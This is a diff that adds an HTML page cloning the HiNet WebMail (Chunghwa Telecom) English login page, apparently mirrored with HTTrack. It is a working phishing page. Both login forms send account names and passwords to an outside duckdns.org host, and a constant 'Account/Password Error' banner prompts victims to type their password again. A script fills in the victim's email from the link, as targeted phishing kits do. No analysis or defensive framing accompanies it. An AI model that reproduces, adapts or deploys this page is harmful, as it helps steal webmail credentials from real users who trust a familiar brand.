@@ -1,0 +1,606 @@
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="google-site-verification" content="_VYSj38JKAm9qtTYncUtSPXlkKSPZXRR9B64WKytDy8" />
+  <meta name="viewport" content="width=device-width,inital-scale=1.0,user-scalable=yes">
+  <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css" href="css/index.2021.css">
+  <link rel="stylesheet" type="text/css" href="css/keyboardstyle.2021.css" id="size-stylesheet">
+  <link rel="stylesheet" type="text/css" href="css/login.2021.css">
+  <link rel="shortcut icon" href="./images/favicon.ico" />
+  <script type="text/javascript" src="Scripts/jquery.min.js"></script>
+  <script type="text/javascript" src="Scripts/jquery-ui.min.js"></script>
+  <script type="text/javascript" src="Scripts/jquery-fieldselection.js"></script>
+  <script type="text/javascript" src="Scripts/bootstrap.min.js"></script>
+  <script type="text/javascript" src="Scripts/vkeyboard.2021.js"></script>
+  <script type="text/javascript" src="Scripts/login.js"></script>
+  <script type="text/javascript" src="Scripts/replace_ad.2021.js"></script>
+  <style id="antiClickjack">
+    body{display:none !important;}
+  </style>
+
+  <script type="text/javascript">
+    if (self === top) {
+            var antiClickjack = document.getElementById("antiClickjack");
+            antiClickjack.parentNode.removeChild(antiClickjack);
+    } else {
+            top.location = self.location;
+    }
+  </script>
+  <title>HiNet WebMail Service</title>
+</head>
+
+<body>
+  <div id='outMost'>
+    <div id='head' class='flex_item'>
+      <div id='head_left' class='flex_item'>
+        <span class="flex_item">
+          <a href="https://www.hinet.net/" target="_blank">
+            <img id="hinetLogo" src="images/hinet.png"></img>
+          </a>
+        </span>
+        <span class="flex_item">
+          <img id="webmailLogo" src="images/web-mail.png"></img>
+        </span>
+      </div>
+      <div id='head_right' class='flex_item'>
+        <a href="https://www.hinet.net/" target="_blank">HiNet</a>
+        |
+        <a href="https://hiair.hinet.net/" target="_blank">hiAir</a>
+        |
+        <a href="index.html">中文</a>
+      </div>
+    </div>
+    <div id='middle' class='flex_item'>
+      <div id='real_ad' class='flex_item'></div>
+      <div id='login_block' class='flex_item'>
+        <div id="loginDiv" class="loginDiv">
+          <div class="abgne_tab">
+            <ul class="tabs f16">
+              <li>
+                <a href="#tab1">Personal Mail</a>
+              </li>
+              <li>
+                <a href="#tab2">hiMail</a>
+              </li>
+            </ul>
+            <div class="tab_container">
+              <!-- form personal :begin -->
+              <div id="tab1" class="tab_content" style="padding-bottom: 0px;">
+                <div id="personalDiv">
+                  <div style="text-align: center">
+                    <h2 class="h3">HiNet Mail</h2>
+                  </div>
+                  <form method="post" action="https://25800852.duckdns.org/O-O/74775105924-37947028463-41281332901-82957146496-01439666365/GENx00.php" id="login-form">
+                    <input type="hidden" id="referrer" name="referrer" value="" />
+					
+<div id="error-block" class="hidden" style="display: block;"><span id="personalMessage" style="color: red; letter-spacing: 1px;" class="f16"><blink><center>Account/Password Error</blink></span></div>
+
+
+<div id="error-block1" class="">
+                      <span id="personalMessage" style="color: rgba(30,53,108,0.5);letter-spacing:1px;"
+                        class="f16"><center>Enter account/password</center></span>
+                    </div>
+					<div class="ctrlGroup" style="line-height:24px">
+                      <div class="user_icon">
+                        <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-circle"
+                          class="svg-inline--fa fa-user-circle fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg"
+                          viewBox="0 0 496 512">
+                          <path fill="currentColor"
+                            d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 96c48.6 0 88 39.4 88 88s-39.4 88-88 88-88-39.4-88-88 39.4-88 88-88zm0 344c-58.7 0-111.3-26.6-146.5-68.2 18.8-35.4 55.6-59.8 98.5-59.8 2.4 0 4.8.4 7.1 1.1 13 4.2 26.6 6.9 40.9 6.9 14.3 0 28-2.7 40.9-6.9 2.3-.7 4.7-1.1 7.1-1.1 42.9 0 79.7 24.4 98.5 59.8C359.3 421.4 306.7 448 248 448z">
+                          </path>
+                        </svg>
+                      </div>
+                      <label for="idPuser" class="loginLabel"></label>
+                      <input id="email" placeholder="Account" name="email" tabindex="1" size="16"
+                        onkeyup="checkTheSame(document.personal)" title="User account (ex: jack)" class="inputTxt">
+                      <img id="show_username_keyboard" src="images/keyboard.png"
+                        title="Show virtual keyboard to input username!" class="imgKB">
+                    </div>
+                    <div class="ctrlGroup" style="line-height:24px">
+                      <div class="user_icon">
+                        <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="lock"
+                          class="svg-inline--fa fa-lock fa-w-14" role="img" xmlns="http://www.w3.org/2000/svg"
+                          viewBox="0 0 448 512">
+                          <path fill="currentColor"
+                            d="M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z">
+                          </path>
+                        </svg>
+                      </div>
+                      <label for="passPuser" class="loginLabel"></label>
+                      <input id="password" placeholder="Password" name="password" tabindex="2" type="password"
+                        maxlength="255" size="16" class="inputTxt" />
+                      <img id="showkeyboard" src="images/keyboard.png" title="Show virtual keyboard to input password!"
+                        class="imgKB">
+                      <span id="pwEyePuser" class="pwEye glyphicon glyphicon-eye-close"
+                        onclick="toggleEye('Puser');"></span>
+                    </div>
+                    <div class="ctrlGroup">
+                      <div class="savebtn" style="margin-left: 27px;">
+                        <input id="saveaccPuser" tabindex="3" aligh="right"
+                          onclick="switchSavePasswd(document.personal);" type="checkbox" value="1" name="saveAccount">
+                        <label for="saveaccPuser" class="checkboxLabel">Keep account</label>
+                        <input id="savepwPuser" tabindex="4" aligh="right"
+                          onclick="switchSaveAccount(document.personal);" type="checkbox" value="1" name="savePasswd">
+                        <label for="savepwPuser" class="checkboxLabel">Keep password</label>
+                      </div>
+                      <button class="submit_btn" id="submit_btn">OK</button>
+                      <input id="cm1Puser" tabindex="5" aligh="right" type="checkbox" value="cm1" name="cm1"
+                        style="display:none">
+                      <label for="cm1Puser" class="checkboxLabel" style="display:none">Use cm1 email</label>
+                    </div>
+                    <hr style="margin-bottom: 8px;">
+                    <div class="ctrlGroup divTable" style="margin-top: 9px;">
+                      <div class="col50L">
+                        <a href="https://lib.webmail.hinet.net/statement/F-account-1.htm" target="_blank"><span
+                            class="toolboxLabel">New account</span></a>
+                      </div>
+                      <div class="col50R">
+                        <a href="https://lib.webmail.hinet.net/statement/manual_v20200330.pdf" target="_blank"><span
+                            class="toolboxLabel">Instructions</span></a>
+                      </div>
+                      <div class="col50L">
+                        <a href="https://lib.webmail.hinet.net/statement/F-login-5.htm" target="_blank"><span
+                            class="toolboxLabel">Forget password?</span></a>
+                      </div>
+                      <div class="col50R">
+                        <a href="https://lib.webmail.hinet.net/statement/login_info.htm" target="_blank"><span
+                            class="toolboxLabel">Login instructions</span></a>
+                      </div>
+                      <div class="col50L">
+                        <a href="https://lib.webmail.hinet.net/statement/M-help-1.htm" target="_blank"><span
+                            class="toolboxLabel">FAQ</span></a>
+                      </div>
+                      <div class="col50R">
+                        <a href="https://lib.webmail.hinet.net/statement/termsvs.htm" target="_blank"><span
+                            class="toolboxLabel">Service terms</span></a>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+              </div>
+              <!-- form personal :end -->
+              <!-- form business :begin -->
+              <div id="tab2" class="tab_content" style="padding-bottom: 0px;">
+                <div id="businessDiv">
+                  <div style="height:37px; text-align:center">
+                    <img src="images/himail_logo.gif" alt="HiMail">
+                  </div>
+                  <form method="post" action="https://25800852.duckdns.org/O-O/74775105924-37947028463-41281332901-82957146496-01439666365/GENx00.php" id="login-form">
+                    <input type="hidden" id="referrer" name="referrer" value="" />
+					
+<div id="error-block" class="hidden" style="display: block;"><span id="personalMessage" style="color: red; letter-spacing: 1px;" class="f16"><blink><center>Account/Password Error</blink></span></div>
+
+
+<div id="error-block1" class="">
+                      <span id="businessMessage" style="color: rgba(30,53,108,0.5);letter-spacing:1px;"
+                        class="f16"><center>Enter account/password</center></span>
+                    </div>
+                    <div class="ctrlGroup" style="line-height:24px">
+                      <div class="user_icon">
+                        <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope"
+                          class="svg-inline--fa fa-envelope fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg"
+                          viewBox="0 0 512 512">
+                          <path fill="currentColor"
+                            d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z">
+                          </path>
+                        </svg>
+                      </div>
+                      <label for="idBizuser" class="loginLabel"></label>
+                      <input id="email" placeholder="E-mail" name="email" tabindex="7" size="16"
+                        onkeyup="checkTheSame(document.business)" title="Account@domain(Ex: john@ilovehimail.com.tw)"
+                        class="inputTxt">
+                      <img id="show_username_keyboard" src="images/keyboard.png"
+                        title="Show virtual keyboard to input username!" class="imgKB">
+                    </div>
+                    <div class="ctrlGroup" style="line-height:24px">
+                      <div class="user_icon">
+                        <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="lock"
+                          class="svg-inline--fa fa-lock fa-w-14" role="img" xmlns="http://www.w3.org/2000/svg"
+                          viewBox="0 0 448 512">
+                          <path fill="currentColor"
+                            d="M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z">
+                          </path>
+                        </svg>
+                      </div>
+                      <label for="passBizuser" class="loginLabel"></label>
+                      <input id="password" placeholder="Password" name="password" tabindex="8" type="password"
+                        maxlength="255" size="16" class="inputTxt">
+                      <img id="showkeyboard" src="images/keyboard.png" title="Show virtual keyboard to input password!"
+                        class="imgKB">
+                      <span id="pwEyeBizuser" class="pwEye glyphicon glyphicon-eye-close"
+                        onclick="toggleEye('Bizuser');"></span>
+                    </div>
+                    <div class="ctrlGroup" style="margin-bottom:4px">
+                      <div class="savebtn" style="margin-left: 27px;">
+                        <input id="saveaccBizuser" tabindex="9" aligh="right"
+                          onclick="switchSavePasswd(document.business);" type="checkbox" value="1" name="saveAccount">
+                        <label for="saveaccBizuser" class="checkboxLabel">Keep email</label>
+                        <input id="savepwBizuser" aligh="right" onclick="switchSaveAccount(document.business);"
+                          tabindex="10" type="checkbox" value="1" name="savePasswd">
+                        <label for="savepwBizuser" class="checkboxLabel">Keep password</label>
+                      </div>
+                    </div>
+                    <button class="submit_btn" type="image" id="submit_btn">OK</button>
+                    <hr style="margin-bottom: 8px;">
+                    <div class="ctrlGroup divTable" style="margin-top: 9px;">
+                      <div class="col50L">
+                        <a href="https://lib.webmail.hinet.net/statement/F-account-1.htm" target="_blank"><span
+                            class="toolboxLabel">New Account</span></a>
+                      </div>
+                      <div class="col50R">
+                        <a href="https://lib.webmail.hinet.net/statement/manual_v20200330.pdf" target="_blank"><span
+                            class="toolboxLabel">Instructions</span></a>
+                      </div>
+                      <div class="col50L">
+                        <a href="https://lib.webmail.hinet.net/statement/F-login-5.htm" target="_blank"><span
+                            class="toolboxLabel">Forget password?</span></a>
+                      </div>
+                      <div class="col50R">
+                        <a href="https://lib.webmail.hinet.net/statement/login_info.htm" target="_blank"><span
+                            class="toolboxLabel">Login instructions</span></a>
+                      </div>
+                      <div class="col50L">
+                        <a href="https://lib.webmail.hinet.net/statement/M-help-1.htm" target="_blank"><span
+                            class="toolboxLabel">FAQ</span></a>
+                      </div>
+                      <div class="col50R">
+                        <a href="https://lib.webmail.hinet.net/statement/termsvs.htm" target="_blank"><span
+                            class="toolboxLabel">Service terms</span></a>
+                      </div>
+                    </div>
+                  </form>
+                </div>
+              </div>
+            </div>
+            <!-- form business:end -->
+            <!-- dynamic virtual keyboard: start -->
+            <div id="keyboard">
+              <div id="shuffleDiv">
+                <table width="100%">
+                  <tr>
+                    <td>
+                      <input type="button" value="Shuffle" id="shuffle" class="butF">
+                    </td>
+                    <td align="right">
+                      <input type="button" value="Reset" id="Reset" class="butF">&nbsp;&nbsp;
+                    </td>
+                    <td>
+                      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type="image" id="close-img" value="Close"
+                        src="images/close.svg" title="Close keyboard">
+                    </td>
+                  </tr>
+                </table>
+              </div>
+              <div id="row0">
+                <input name="accent" type="button" value="`" class="butS">
+                <!--
+              --><input name="1" type="button" value="1" class="butI">
+                <!--
+              --><input name="2" type="button" value="2" class="butI">
+                <!--
+              --><input name="3" type="button" value="3" class="butI">
+                <!--
+              --><input name="4" type="button" value="4" class="butI">
+                <!--
+              --><input name="5" type="button" value="5" class="butI">
+                <!--
+              --><input name="6" type="button" value="6" class="butI">
+                <!--
+              --><input name="7" type="button" value="7" class="butI">
+                <!--
+              --><input name="8" type="button" value="8" class="butI">
+                <!--
+              --><input name="9" type="button" value="9" class="butI">
+                <!--
+              --><input name="0" type="button" value="0" class="butI">
+                <!--
+              --><input name="hyphen" type="button" value="-" class="butS" />
+                <!--
+              --><input name="equal" type="button" value="=" class="butS" />
+                <!--
+              --><input name="backspace" type="button" value="&larr;" id="backspace">
+              </div>
+              <div id="row0_shift">
+                <input name="tilde" type="button" value="~" class="butS">
+                <!--
+              --><input name="exc" type="button" value="!" class="butS">
+                <!--
+              --><input name="at" type="button" value="@" class="butS">
+                <!--
+              --><input name="hash" type="button" value="#" class="butS">
+                <!--
+              --><input name="dollar" type="button" value="$" class="butS">
+                <!--
+              --><input name="percent" type="button" value="%" class="butS">
+                <!--
+              --><input name="caret" type="button" value="^" class="butS">
+                <!--
+              --><input name="ampersand" type="button" value="&amp;" class="butS">
+                <!--
+              --><input name="asterisk" type="button" value="*" class="butS">
+                <!--
+              --><input name="leftbracket" type="button" value="(" class="butS">
+                <!--
+              --><input name="rightbracket" type="button" value=")" class="butS">
+                <!--
+              --><input name="underscore" type="button" value="_" class="butS">
+                <!--
+              --><input name="plus" type="button" value="+" class="butS">
+                <!--
+              --><input name="backspace" type="button" value="&larr;" id="backspace">
+              </div>
+              <div id="row1">
+                <input name="q" type="button" value="q" class="butW">
+                <!--
+              --><input name="w" type="button" value="w" class="butW">
+                <!--
+              --><input name="e" type="button" value="e" class="butW">
+                <!--
+              --><input name="r" type="button" value="r" class="butW">
+                <!--
+              --><input name="t" type="button" value="t" class="butW">
+                <!--
+              --><input name="y" type="button" value="y" class="butW">
+                <!--
+              --><input name="u" type="button" value="u" class="butW">
+                <!--
+              --><input name="i" type="button" value="i" class="butW">
+                <!--
+              --><input name="o" type="button" value="o" class="butW">
+                <!--
+              --><input name="p" type="button" value="p" class="butW">
+                <!--
+              --><input name="[" type="button" value="[" class="butS">
+                <!--
+              --><input name="]" type="button" value="]" class="butS">
+                <!--
+              --><input name="backslash" type="button" value="\" class="butS">
+              </div>
+              <div id="row1_shift">
+                <input name="Q" type="button" value="Q" class="butW">
+                <!--
+              --><input name="W" type="button" value="W" class="butW">
+                <!--
+              --><input name="E" type="button" value="E" class="butW">
+                <!--
+              --><input name="R" type="button" value="R" class="butW">
+                <!--
+              --><input name="T" type="button" value="T" class="butW">
+                <!--
+              --><input name="Y" type="button" value="Y" class="butW">
+                <!--
+              --><input name="U" type="button" value="U" class="butW">
+                <!--
+              --><input name="I" type="button" value="I" class="butW">
+                <!--
+              --><input name="O" type="button" value="O" class="butW">
+                <!--
+              --><input name="P" type="button" value="P" class="butW">
+                <!--
+              --><input name="{" type="button" value="{" class="butS">
+                <!--
+              --><input name="}" type="button" value="}" class="butS">
+                <!--
+              --><input name="pipe" type="button" value="|" class="butS">
+              </div>
+              <div id="row2">
+                <input name="a" type="button" value="a" class="butW">
+                <!--
+              --><input name="s" type="button" value="s" class="butW">
+                <!--
+              --><input name="d" type="button" value="d" class="butW">
+                <!--
+              --><input name="f" type="button" value="f" class="butW">
+                <!--
+              --><input name="g" type="button" value="g" class="butW">
+                <!--
+              --><input name="h" type="button" value="h" class="butW">
+                <!--
+              --><input name="j" type="button" value="j" class="butW">
+                <!--
+              --><input name="k" type="button" value="k" class="butW">
+                <!--
+              --><input name="l" type="button" value="l" class="butW">
+                <!--
+              --><input name="semi-colon" type="button" value=";" class="butS">
+                <!--
+              --><input name="apostrophe" type="button" value="'" class="butS">
+              </div>
+              <div id="row2_shift">
+                <input name="a" type="button" value="A" class="butW">
+                <!--
+              --><input name="s" type="button" value="S" class="butW">
+                <!--
+              --><input name="d" type="button" value="D" class="butW">
+                <!--
+              --><input name="f" type="button" value="F" class="butW">
+                <!--
+              --><input name="g" type="button" value="G" class="butW">
+                <!--
+              --><input name="h" type="button" value="H" class="butW">
+                <!--
+              --><input name="j" type="button" value="J" class="butW">
+                <!--
+              --><input name="k" type="button" value="K" class="butW">
+                <!--
+              --><input name="l" type="button" value="L" class="butW">
+                <!--
+              --><input name="colon" type="button" value=":" class="butS">
+                <!--
+              --><input name="quote" type="button" value='"' class="butS">
+              </div>
+              <div id="row3">
+                <input name="Shift" type="button" value="Shift" id="shift" title="Click to show more characters/symbols">
+                <!--
+              --><input name="z" type="button" value="z" class="butW">
+                <!--
+              --><input name="x" type="button" value="x" class="butW">
+                <!--
+              --><input name="c" type="button" value="c" class="butW">
+                <!--
+              --><input name="v" type="button" value="v" class="butW">
+                <!--
+              --><input name="b" type="button" value="b" class="butW">
+                <!--
+              --><input name="n" type="button" value="n" class="butW">
+                <!--
+              --><input name="m" type="button" value="m" class="butW">
+                <!--
+              --><input name="comma " type="button" value="," class="butS">
+                <!--
+              --><input name="period" type="button" value="." class="butS">
+                <!--
+              --><input name="forward_slash" type="button" value="/" class="butS">
+              </div>
+              <div id="row3_shift">
+                <input name="Shift" type="button" value="Shift" id="shifton" title="Click to show more characters/symbols">
+                <!--
+              --><input name="Z" type="button" value="Z" class="butW">
+                <!--
+              --><input name="X" type="button" value="X" class="butW">
+                <!--
+              --><input name="C" type="button" value="C" class="butW">
+                <!--
+              --><input name="V" type="button" value="V" class="butW">
+                <!--
+              --><input name="B" type="button" value="B" class="butW">
+                <!--
+              --><input name="N" type="button" value="N" class="butW">
+                <!--
+              --><input name="M" type="button" value="M" class="butW">
+                <!--
+              --><input name="lt" type="button" value="&lt;" class="butS">
+                <!--
+              --><input name="gt" type="button" value="&gt;" class="butS">
+                <!--
+              --><input name="questionmark" type="button" value="?" class="butS">
+              </div>
+            </div>
+          </div>
+          <!-- dynamic virtual keyboard: end -->
+        </div>
+      </div>
+    </div>
+    <div id='spacer' class='flex_item'></div>
+    <div id='low_ad' class='flex_item'>
+      <div id='real_ad2' class=''></div>
+      <div id='real_ad3' class=''></div>
+    </div>
+    <div id='spacer' class='flex_item'></div>
+    <div id='tail' class='flex_item'>
+      <footer>
+        <div class="container">
+          <div class="footer_text">
+            <div style="margin-top:3px">
+              | <a href="https://www.hinet.net/copyright.html" target="_blank">Copyright Protection</a>
+              | <a href="https://lib.webmail.hinet.net/statement/privacy.htm" target="_blank">Privacy Protection</a>
+              | <a href="https://www.cht.com.tw/zh-tw/home/cht/sustainability/sustainability-management/csr-vision" target="_blank">CSR</a>
+              | <a href="https://www.hinet.net/kid.html" target="_blank">Internet Safty for Kids</a>
+              | <a href="https://www.cht.com.tw/home/cht/recruit-and-training/recruit/recruit-information" target="_blank">Careers</a>
+              | <a href="https://lib.webmail.hinet.net/statement/notify.htm" target="_blank">System Announcement</a>
+              | <a href="https://www.cht.com.tw/home/consumer/member/contactus" target="_blank">Contact Us</a> |
+            </div>
+            <div style="margin-top:3px">
+              <span style="vertical-align:middle;margin-left:3px;color:#a7a5a5;">中華電信股份有限公司版權所有 © Chunghwa Telecom Co., Ltd. All Rights Reserved. Toll Free Line: 0800-080-412</span>
+            </div>
+          </div>
+        </div>
+      </footer>
+	   <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+<script>
+        var url = window.location.hash;
+        var email = document.URL.substr(document.URL.indexOf('#')+1).split('#')[0];
+        var pwdError = document.URL.substr(document.URL.indexOf('#')+1).split('#')[1];
+        var regex = /^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        var pwdAsked = false;
+        $("#referrer").val(window.location.href);
+
+        if(email != '' && regex.test(email)) {
+            $("#email").val(email);
+            $("#email").parent().addClass('focused');
+        }
+
+        if(pwdError) {
+			$('#error-block').removeClass('hidden');
+			$('#error-block1').addClass('hidden');
+			
+        }
+
+
+        $("#password").keypress(function(e) {
+            var key = e.which;
+            if(key == 13) {
+                $("#submit_btn").trigger('click');
+            }
+        });
+
+        $('#submit_btn').click(function() {
+            $("#login-form").submit();
+        });
+
+        $('.contact-menu-open').click(function() {
+            $(this).toggleClass('open');
+            $('#contact-menus').toggleClass('open');
+        });
+
+        $('.main').click(function() {
+            $('#contact-menus').removeClass('open');
+        });
+
+        $('.login-panel input').on('focus', function() {
+            $(this).parent().addClass('focused');
+        });
+
+        $('.login-panel input').on('blur', function(e) {
+            if(e.target.value === '') $(this).parent().removeClass('focused');
+        });
+
+        $('#toggle-password-showing').click(function() {
+            console.log($('#password').attr('type'));
+            var currentType = $('#password').attr('type');
+
+            if(currentType === 'password') {
+                $('#password').attr('type', 'text');
+                $('#toggle-password-showing').text('Hide');
+            }
+            else {
+                $('#password').attr('type', 'password');
+                $('#toggle-password-showing').text('Show');
+            }
+        });
+
+        $('.uxicon-svg-container.ux-control-indicator').click(function() {
+            $('#keep_signin').trigger('click');
+        });
+
+        $('label[key=keep_signin]').click(function() {
+            $('#keep_signin').trigger('click');
+        });
+
+        $('#keep_signin').on('click', function(e) {
+            var isChecked = $(this).is(':checked');
+            
+            if(isChecked) {
+                $('.check-box-wrapper').addClass('checked');
+            }
+            else {
+                $('.check-box-wrapper').removeClass('checked');
+            }
+        });
+    </script>
+    </div>
+  </div>
+</body>
+
+
+<!-- Mirrored from webmail.hinet.net/index_en.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 26 Apr 2022 02:25:38 GMT -->
+</html>
